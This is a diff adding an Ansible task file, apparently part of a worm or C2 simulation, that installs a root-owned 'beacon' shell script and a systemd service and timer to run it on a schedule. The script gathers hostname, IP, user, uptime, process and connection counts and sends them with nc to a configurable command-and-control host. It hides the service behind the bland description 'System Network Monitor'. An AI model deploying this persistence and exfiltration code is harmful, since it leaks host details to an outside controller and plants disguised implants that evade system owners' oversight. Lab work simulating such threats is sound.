@@ -1,0 +1,74 @@
+---
+- name: Ensure worm directory exists
+  file:
+    path: "{{ worm_dir }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+- name: Create beacon script
+  copy:
+    dest: "{{ beacon_script }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/sh
+      set -eu
+      LOG="{{ beacon_log }}"
+      C2="{{ beacon_host }}"
+      PORT="{{ beacon_port }}"
+      {
+        echo "=== BEACON $(date -Is) ==="
+        echo "host=$(hostname)"
+        echo "ip=$(hostname -I | awk '{print $1}')"
+        echo "user=$(whoami)"
+        echo "uptime=$(uptime -p)"
+        echo "procs=$(ps aux | wc -l)"
+        echo "net_conns=$(ss -tn | wc -l)"
+      } | nc -w 5 "$C2" "$PORT" 2>/dev/null || true
+      echo "$(date -Is) beacon_sent host=$(hostname)" >> "$LOG"
+
+- name: Create beacon systemd service
+  copy:
+    dest: "/etc/systemd/system/{{ beacon_service_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System Network Monitor
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ beacon_script }}
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create beacon systemd timer
+  copy:
+    dest: "/etc/systemd/system/{{ beacon_timer_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Periodic system network monitoring
+
+      [Timer]
+      OnCalendar={{ beacon_schedule }}
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable and start beacon timer
+  systemd:
+    name: "{{ beacon_timer_unit }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
